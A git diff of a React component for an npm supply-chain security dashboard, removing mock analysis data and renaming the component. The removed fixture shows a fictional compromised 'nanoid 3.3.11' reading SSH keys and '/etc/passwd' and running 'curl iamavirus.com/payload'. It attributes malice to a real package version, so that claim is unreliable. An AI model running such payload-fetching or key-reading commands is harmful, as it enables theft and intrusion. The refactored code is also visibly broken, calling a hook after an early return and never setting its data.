@@ -6,6 +6,7 @@ import {
   HardDrive,
   Shield,
 } from "lucide-react";
+import { useState } from 'react';
 
 interface AnalysisData {
   id: string;
@@ -30,189 +31,14 @@ interface AnalysisData {
   };
 }
 
-interface BehaviouralAnalysisProps {
+interface AnalysisProps {
   selectedNode: string | null;
-  onClose: () => void;
 }
 
-const mockData: Record<string, AnalysisData> = {
-  kleur: {
-    id: "kleur",
-    name: "kleur",
-    version: "4.1.5",
-    status: "safe",
-    riskLevel: "low",
-    behaviors: {
-      fileAccess: ["/etc/os-release (READ)", "/node_modules (READ)"],
-      networkCalls: ["npmjs.com (HTTPS)", "registry.npmjs.org (HTTPS)"],
-      processSpawns: [],
-    },
-    findings: [
-      { type: "info", message: "No suspicious file system access detected" },
-      { type: "info", message: "All network calls to known registries" },
-      { type: "info", message: "No unexpected process spawning" },
-    ],
-    metadata: {
-      author: "lukeed",
-      downloads: "15M weekly",
-      lastPublished: "2023-08-15",
-      license: "MIT",
-    },
-  },
-  "nanoid-3.3.10": {
-    id: "nanoid-3.3.10",
-    name: "nanoid",
-    version: "3.3.10",
-    status: "safe",
-    riskLevel: "low",
-    behaviors: {
-      fileAccess: ["/etc/os-release (READ)", "/dev/urandom (READ)"],
-      networkCalls: ["npmjs.com (HTTPS)", "example.com (HTTPS)"],
-      processSpawns: [],
-    },
-    findings: [
-      {
-        type: "info",
-        message: "Standard entropy source access for ID generation",
-      },
-      { type: "info", message: "Legitimate network activity observed" },
-      { type: "info", message: "No malicious behavior patterns detected" },
-    ],
-    metadata: {
-      author: "ai",
-      downloads: "45M weekly",
-      lastPublished: "2024-01-10",
-      license: "MIT",
-    },
-  },
-  "nanoid-3.3.11": {
-    id: "nanoid-3.3.11",
-    name: "nanoid",
-    version: "3.3.11",
-    status: "flagged",
-    riskLevel: "critical",
-    behaviors: {
-      fileAccess: [
-        "/etc/passwd (READ) ⚠️",
-        "~/.ssh/id_rsa (READ ATTEMPT) ⚠️",
-        "~/.ssh/known_hosts (READ) ⚠️",
-        "/dev/urandom (READ)",
-      ],
-      networkCalls: [
-        "git.github.com (HTTPS)",
-        "randomguy.github.io (HTTPS)",
-        "iamavirus.com (HTTPS) ⚠️ SUSPICIOUS",
-      ],
-      processSpawns: ["curl iamavirus.com/payload ⚠️"],
-    },
-    findings: [
-      {
-        type: "critical",
-        message: "UNAUTHORIZED: Attempted to read SSH private keys",
-      },
-      {
-        type: "critical",
-        message: "SUSPICIOUS: Network call to previously unseen domain",
-      },
-      {
-        type: "critical",
-        message:
-          "MALICIOUS: Process spawning detected - potential exfiltration",
-      },
-      {
-        type: "warning",
-        message: "SECURITY: Read system password file without justification",
-      },
-    ],
-    metadata: {
-      author: "unknown-maintainer",
-      downloads: "125K weekly",
-      lastPublished: "2024-02-20",
-      license: "MIT",
-    },
-  },
-  "example-dep": {
-    id: "example-dep",
-    name: "example.com",
-    version: "network",
-    status: "safe",
-    riskLevel: "low",
-    behaviors: {
-      fileAccess: [],
-      networkCalls: ["example.com (HTTPS)"],
-      processSpawns: [],
-    },
-    findings: [
-      {
-        type: "info",
-        message: "Known safe domain - example.com is a documentation domain",
-      },
-    ],
-    metadata: {
-      author: "N/A",
-      downloads: "N/A",
-      lastPublished: "N/A",
-      license: "N/A",
-    },
-  },
-  "npmjs-dep": {
-    id: "npmjs-dep",
-    name: "npmjs.com",
-    version: "network",
-    status: "safe",
-    riskLevel: "low",
-    behaviors: {
-      fileAccess: [],
-      networkCalls: ["npmjs.com (HTTPS)", "registry.npmjs.org (HTTPS)"],
-      processSpawns: [],
-    },
-    findings: [
-      { type: "info", message: "Official npm registry - expected behavior" },
-    ],
-    metadata: {
-      author: "N/A",
-      downloads: "N/A",
-      lastPublished: "N/A",
-      license: "N/A",
-    },
-  },
-  "suspicious-dep": {
-    id: "suspicious-dep",
-    name: "iamavirus.com",
-    version: "network",
-    status: "flagged",
-    riskLevel: "critical",
-    behaviors: {
-      fileAccess: [],
-      networkCalls: ["iamavirus.com (HTTPS) ⚠️ MALICIOUS"],
-      processSpawns: [],
-    },
-    findings: [
-      {
-        type: "critical",
-        message: "BLOCKED: Domain matches known malicious patterns",
-      },
-      {
-        type: "critical",
-        message: "NEW BEHAVIOR: Never seen in legitimate packages",
-      },
-    ],
-    metadata: {
-      author: "N/A",
-      downloads: "N/A",
-      lastPublished: "N/A",
-      license: "N/A",
-    },
-  },
-};
-
-export function BehaviouralAnalysis({
-  selectedNode,
-}: BehaviouralAnalysisProps) {
+export function Analysis({ selectedNode }: AnalysisProps) {
   if (!selectedNode) return null;
 
-  const data = mockData[selectedNode];
-  if (!data) return null;
+  const [analysisData, setAnalysisData] = useState<AnalysisData>();
 
   const getStatusColor = (status: string) => {
     switch (status) {
@@ -266,6 +92,10 @@ export function BehaviouralAnalysis({
     }
   };
 
+  if (!analysisData) {
+    return null;
+  }
+
   return (
     <div
       className="h-full flex flex-col overflow-hidden"
@@ -282,30 +112,30 @@ export function BehaviouralAnalysis({
       >
         <div className="flex items-center gap-2 mb-2">
           <h2 className="text-xl" style={{ color: "#22c55e" }}>
-            {data.name}
+            {analysisData.name}
           </h2>
           <span
             className="text-xs px-2 py-1 rounded"
             style={{
-              background: getStatusColor(data.status) + "20",
-              color: getStatusColor(data.status),
-              border: `1px solid ${getStatusColor(data.status)}`,
+              background: getStatusColor(analysisData.status) + "20",
+              color: getStatusColor(analysisData.status),
+              border: `1px solid ${getStatusColor(analysisData.status)}`,
             }}
           >
-            {data.status.toUpperCase()}
+            {analysisData.status.toUpperCase()}
           </span>
         </div>
         <div className="flex items-center gap-3 text-sm">
-          <span style={{ color: "#9ca3af" }}>v{data.version}</span>
+          <span style={{ color: "#9ca3af" }}>v{analysisData.version}</span>
           <span
             className="px-2 py-0.5 rounded text-xs"
             style={{
-              background: getRiskColor(data.riskLevel) + "20",
-              color: getRiskColor(data.riskLevel),
-              border: `1px solid ${getRiskColor(data.riskLevel)}`,
+              background: getRiskColor(analysisData.riskLevel) + "20",
+              color: getRiskColor(analysisData.riskLevel),
+              border: `1px solid ${getRiskColor(analysisData.riskLevel)}`,
             }}
           >
-            {data.riskLevel.toUpperCase()} RISK
+            {analysisData.riskLevel.toUpperCase()} RISK
           </span>
         </div>
       </div>
@@ -319,7 +149,7 @@ export function BehaviouralAnalysis({
             </h3>
           </div>
           <div className="space-y-2">
-            {data.findings.map((finding, idx) => (
+            {analysisData.findings.map((finding, idx) => (
               <div
                 key={idx}
                 className="p-3 rounded-lg border"
@@ -355,8 +185,8 @@ export function BehaviouralAnalysis({
               border: `1px solid #374151`,
             }}
           >
-            {data.behaviors.fileAccess.length > 0 ? (
-              data.behaviors.fileAccess.map((file, idx) => (
+            {analysisData.behaviors.fileAccess.length > 0 ? (
+              analysisData.behaviors.fileAccess.map((file, idx) => (
                 <div
                   key={idx}
                   style={{
@@ -386,8 +216,8 @@ export function BehaviouralAnalysis({
               border: `1px solid #374151`,
             }}
           >
-            {data.behaviors.networkCalls.length > 0 ? (
-              data.behaviors.networkCalls.map((call, idx) => (
+            {analysisData.behaviors.networkCalls.length > 0 ? (
+              analysisData.behaviors.networkCalls.map((call, idx) => (
                 <div
                   key={idx}
                   style={{
@@ -403,7 +233,7 @@ export function BehaviouralAnalysis({
           </div>
         </section>
 
-        {data.behaviors.processSpawns.length > 0 && (
+        {analysisData.behaviors.processSpawns.length > 0 && (
           <section>
             <div className="flex items-center gap-2 mb-3">
               <AlertTriangle className="w-5 h-5" style={{ color: "#ef4444" }} />
@@ -418,7 +248,7 @@ export function BehaviouralAnalysis({
                 border: "1px solid #ef4444",
               }}
             >
-              {data.behaviors.processSpawns.map((process, idx) => (
+              {analysisData.behaviors.processSpawns.map((process, idx) => (
                 <div key={idx} style={{ color: "#ef4444" }}>
                   {process}
                 </div>
@@ -443,23 +273,23 @@ export function BehaviouralAnalysis({
           >
             <div className="flex justify-between">
               <span style={{ color: "#9ca3af" }}>Author:</span>
-              <span style={{ color: "#e5e7eb" }}>{data.metadata.author}</span>
+              <span style={{ color: "#e5e7eb" }}>{analysisData.metadata.author}</span>
             </div>
             <div className="flex justify-between">
               <span style={{ color: "#9ca3af" }}>Downloads:</span>
               <span style={{ color: "#e5e7eb" }}>
-                {data.metadata.downloads}
+                {analysisData.metadata.downloads}
               </span>
             </div>
             <div className="flex justify-between">
               <span style={{ color: "#9ca3af" }}>Last Published:</span>
               <span style={{ color: "#e5e7eb" }}>
-                {data.metadata.lastPublished}
+                {analysisData.metadata.lastPublished}
               </span>
             </div>
             <div className="flex justify-between">
               <span style={{ color: "#9ca3af" }}>License:</span>
-              <span style={{ color: "#e5e7eb" }}>{data.metadata.license}</span>
+              <span style={{ color: "#e5e7eb" }}>{analysisData.metadata.license}</span>
             </div>
           </div>
         </section>
